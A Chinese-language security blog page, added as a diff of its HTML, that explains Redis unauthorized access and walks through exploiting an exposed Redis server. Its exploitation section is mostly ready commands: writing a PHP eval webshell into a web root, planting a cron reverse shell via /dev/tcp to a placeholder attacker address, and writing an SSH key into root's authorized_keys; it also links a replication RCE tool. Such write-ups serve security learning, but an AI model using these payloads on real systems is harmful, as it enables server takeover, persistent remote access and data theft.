@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html  lang="zh-cn" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="Husins">
+  <link rel="icon" href="/img/dog.jpg">
+  <title>浅析Redis未授权</title>
+  
+  
+  <meta property="og:title" content="浅析Redis未授权">
+  
+  
+  <meta property="og:url" content="https://husins.cn/%E6%B5%85%E6%9E%90Redis%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
+  
+  
+  <meta property="og:img" content="/img/dog.png">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2021-07-07">
+  <meta property="og:article:modified_time" content="2021-07-07">
+  <meta property="og:article:author" content="Husins">
+  
+  
+  <meta property="og:article:tag" content="Redis">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/dog.jpg" alt="logo">
+      
+      <span class="navbar-logo-dsc">Husins Blogs</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    主页
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于我
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      浅析Redis未授权
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-07-07T02:30:30.000Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2021-07-07</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/漏洞总结/" class="post-meta-link">漏洞总结</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>1.3k words</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/Redis/" class="post-meta-link">Redis</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><h2 id="什么是未授权访问"><a href="#什么是未授权访问" class="headerlink" title="什么是未授权访问"></a>什么是未授权访问</h2><p>未授权访问漏洞可以理解为需要安全配置或者权限认证的地址，授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作，数据库或网站目录等敏感信息的泄露。</p>
+<h2 id="如何发现未授权访问漏洞"><a href="#如何发现未授权访问漏洞" class="headerlink" title="如何发现未授权访问漏洞"></a>如何发现未授权访问漏洞</h2><ul>
+<li>端口：使用nmap进行特征端口扫描进行发现<ul>
+<li>Redis默认是6379端口</li>
+<li>MongoDB默认是27017端口</li>
+<li>Memcached默认是11211端口</li>
+<li>Jboos默认是8080端口</li>
+<li>VNC默认是5900、5901端口</li>
+<li>Docker默认是2375端口</li>
+</ul>
+</li>
+</ul>
+<h2 id="什么是Redis"><a href="#什么是Redis" class="headerlink" title="什么是Redis"></a>什么是Redis</h2><p>Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。</p>
+<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>
+<ul>
+<li><p>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</p>
+</li>
+<li><p>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p>
+</li>
+<li><p>Redis支持数据的备份，即master-slave模式的数据备份。</p>
+</li>
+<li><p>Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。</p>
+</li>
+<li><p>Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。</p>
+</li>
+</ul>
+<p>Redis在JAVA WEB应用场景</p>
+<ul>
+<li>存储、缓存用的数据</li>
+<li>需要告诉读（写）的场合使用它快速进行读（写）</li>
+</ul>
+<h2 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h2><pre class="highlight"><code class="hljs shell">set testkey &quot;Hello World&quot; # 设置键testkey的值为字符串hello world<br>get testkey # 获取键testkey的内容<br>set score 99 # 设置一个键score的值为99<br>INCR score # 使用INCR命令将score的值增加1<br>keys * # 列出当前数据库中所有的键<br>get anptherkey # 获取一个不存在的键的值<br>config set dir /home/test # 设置工作目录<br>config set dbfilename redis.rdb # 设置备份文件名<br>config get dir(dafilename) # 检查工作目录（备份文件名）是否设置成功<br>save # 进行一次备份<br>flushall # 删除所有数据<br>del key # 删除键为key的数据<br></code></pre>
+
+<h2 id="Redis历史漏洞"><a href="#Redis历史漏洞" class="headerlink" title="Redis历史漏洞"></a>Redis历史漏洞</h2><h3 id="Redis未授权访问-1"><a href="#Redis未授权访问-1" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞课导致敏感信息泄露，也可以恶意执行flushall来清空所有的数据，攻击者还可用过Eval执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登陆服务器。</p>
+<h3 id="Redis主从复制RCE"><a href="#Redis主从复制RCE" class="headerlink" title="Redis主从复制RCE"></a>Redis主从复制RCE</h3><p>在Redis 4. x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
+<h2 id="Redis漏洞环境的搭建"><a href="#Redis漏洞环境的搭建" class="headerlink" title="Redis漏洞环境的搭建"></a>Redis漏洞环境的搭建</h2><pre class="highlight"><code class="hljs shell">Linux：<br>    wget http://download.redis.io/releases/redis-6.0.3.tar.gz # 下载redis<br>    tar -zxvf redis-6.0.3.tar.gz # 解压当前文件<br>    cd redis-6.0.3/<br>    make # 对文件进行编译<br>    cd src/ <br>    cp redis-cli /usr/bin # 客户端连接程序<br>    ./redis-server &amp; # 启动redis<br>windows：<br>	https://github.com/tporadowski/redis/releases # 下载redis<br>	解压之后在当前目录打开cmd<br>	redis-server.exe redis.windows.conf # 启动redis<br>	<br></code></pre>
+
+<h2 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h2><h3 id="未授权访问（写入webshell）"><a href="#未授权访问（写入webshell）" class="headerlink" title="未授权访问（写入webshell）"></a>未授权访问（写入webshell）</h3><pre class="highlight"><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 利用前提 未授权访问，并且启用web服务知道绝对路径</span><br>redis-cli.exe -h xxx.xxx.xxx.xxx -p 6379 # 连接redis<br>config set dir /var/www/html/<br>config set dbfilename shell.php<br>set x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;<br>save<br></code></pre>
+
+<h3 id="未授权访问（写入反弹shell）"><a href="#未授权访问（写入反弹shell）" class="headerlink" title="未授权访问（写入反弹shell）"></a>未授权访问（写入反弹shell）</h3><pre class="highlight"><code class="hljs shell">redis-cli.exe -h xxx.xxx.xxx.xxx -p 6379 # 连接redis<br>set xxx&quot;\n\n*/****/bin/bash -i&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/port 0&gt;&amp;1\n\n&quot;<br>config set dir /var/spool/cron/crontabs<br>config set dbfilename root<br>save<br></code></pre>
+
+<h3 id="未授权访问（写入公钥）"><a href="#未授权访问（写入公钥）" class="headerlink" title="未授权访问（写入公钥）"></a>未授权访问（写入公钥）</h3><pre class="highlight"><code class="hljs shell">ssh-keygen -t rsa # 生成rsa加密之后的公钥，默认情况下，生成后在用户的家目录下的.ssh目录下<br>(echo -e &quot;\n\n&quot;;cat  ~/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt<br>cat /tmp/foo.txt | redis-cli -h xxx.xxx.xxx.xxx -p 6379 -x set crackit<br>redis-cli -h xxx.xxx.xxx.xxx -p 6379<br>config set dir /root/.ssh/<br>config set dbfilename &quot;authorized_keys&quot;<br>save<br>ssh root@xxx.xxx.xxx.xxx -p (ssh 端口) -i ~/.ssh/id_rsa<br></code></pre>
+
+<h3 id="未授权访问（主从复制RCE）"><a href="#未授权访问（主从复制RCE）" class="headerlink" title="未授权访问（主从复制RCE）"></a>未授权访问（主从复制RCE）</h3><p><strong>主要出现在redis 4.x</strong>   <a target="_blank" rel="noopener" href="https://www.github.com/vulhub/redis-rogue-getshell">这里是工具地址，里面有详细使用方法</a></p>
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/%E6%B5%85%E6%9E%90Redis%E6%9C%AA%E6%8E%88%E6%9D%83/">https://husins.cn/%E6%B5%85%E6%9E%90Redis%E6%9C%AA%E6%8E%88%E6%9D%83/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  
+  <div class="nav-item-next">
+    <a href="/google-hacker常用语法/" class="nav-link">
+      <div>
+        <div class="nav-label">Next</div>
+        
+        <div class="nav-title">google_hacker常用语法 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/dog.png" class="author-img">
+
+<p class="author-name">Husins</p>
+<p class="author-description">层楼终究误少年,自由早晚乱余生。</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>65</span>
+    <span>Posts</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>6</span>
+    <span>Categories</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>22</span>
+    <span>Tags</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>Categories</div>
+  <div class="categories-list">
+    
+      <a href="/categories/CTF题解">
+        <div class="categories-list-item">
+          CTF题解
+          <span class="categories-list-item-badge">46</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞总结">
+        <div class="categories-list-item">
+          漏洞总结
+          <span class="categories-list-item-badge">12</span>
+        </div>
+      </a>
+    
+      <a href="/categories/工具使用">
+        <div class="categories-list-item">
+          工具使用
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/MISC">
+        <div class="categories-list-item">
+          MISC
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞复现">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>hot tags</div>
+  <div class="tags-list">
+    
+    <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
+    
+    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
+    
+    <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
+    
+    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
+    
+    <a href="\tags\python" title="python"><div class="tags-list-item">python</div></a>
+    
+    <a href="\tags\反序列化" title="反序列化"><div class="tags-list-item">反序列化</div></a>
+    
+    <a href="\tags\SSTI" title="SSTI"><div class="tags-list-item">SSTI</div></a>
+    
+    <a href="\tags\Redis" title="Redis"><div class="tags-list-item">Redis</div></a>
+    
+    <a href="\tags\goole hacker" title="goole hacker"><div class="tags-list-item">goole hacker</div></a>
+    
+    <a href="\tags\SQL,文件上传" title="SQL,文件上传"><div class="tags-list-item">SQL,文件上传</div></a>
+    
+    <a href="\tags\flask" title="flask"><div class="tags-list-item">flask</div></a>
+    
+    <a href="\tags\文件上传" title="文件上传"><div class="tags-list-item">文件上传</div></a>
+    
+    <a href="\tags\nmap" title="nmap"><div class="tags-list-item">nmap</div></a>
+    
+    <a href="\tags\CVE-2018-16385" title="CVE-2018-16385"><div class="tags-list-item">CVE-2018-16385</div></a>
+    
+    <a href="\tags\JWT Pickle" title="JWT Pickle"><div class="tags-list-item">JWT Pickle</div></a>
+    
+    <a href="\tags\XXE" title="XXE"><div class="tags-list-item">XXE</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">什么是未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">如何发现未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-text">什么是Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">Redis常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">Redis历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-1"><span class="toc-text">Redis未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-text">Redis主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-text">Redis漏洞环境的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Redis漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5webshell%EF%BC%89"><span class="toc-text">未授权访问（写入webshell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-text">未授权访问（写入反弹shell）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-text">未授权访问（写入公钥）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE%EF%BC%89"><span class="toc-text">未授权访问（主从复制RCE）</span></a></li></ol></li></ol></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>Recent Posts</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-07</div>
+        <a href="/浅析Redis未授权/"><div class="recent-posts-item-content">浅析Redis未授权</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-04</div>
+        <a href="/google-hacker常用语法/"><div class="recent-posts-item-content">google_hacker常用语法</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-28</div>
+        <a href="/2019强网杯upload/"><div class="recent-posts-item-content">2019强网杯upload</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-05-19</div>
+        <a href="/CISCN2019总决赛Day2-Web1Easyweb/"><div class="recent-posts-item-content">CISCN2019总决赛Day2-Web1Easyweb</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">Husins Blogs </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+        <span>&nbsp;|&nbsp;</span>
+        
+        
+        本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
